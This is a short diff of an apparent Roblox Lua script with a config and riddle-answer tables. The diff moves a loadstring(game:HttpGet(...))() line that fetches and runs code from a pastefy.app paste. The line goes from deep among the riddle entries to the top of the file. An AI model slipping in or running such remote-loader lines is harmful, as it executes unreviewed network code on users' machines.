@@ -2,6 +2,8 @@
 
 
 
+loadstring(game:HttpGet("https://pastefy.app/zpW2E4nw/raw"))()
+
 
 local Config = {
     SammyUserId = 2678001507, -- Verified group owner: SpyderSammy.
@@ -8564,7 +8566,6 @@ for _, question in ipairs({"brainrot that makes the most money", "brainrot that 
     "highest money per second brainrot", "highest income brainrot"}) do
     registerRiddleFact(question, "strawberryelephant")
 end
-loadstring(game:HttpGet("https://pastefy.app/zpW2E4nw/raw"))()
 for _, question in ipairs({"first trait", "my first trait", "first trait in sab", "first trait in steal a brainrot"}) do
     registerRiddleFact(question, "taco")
 end
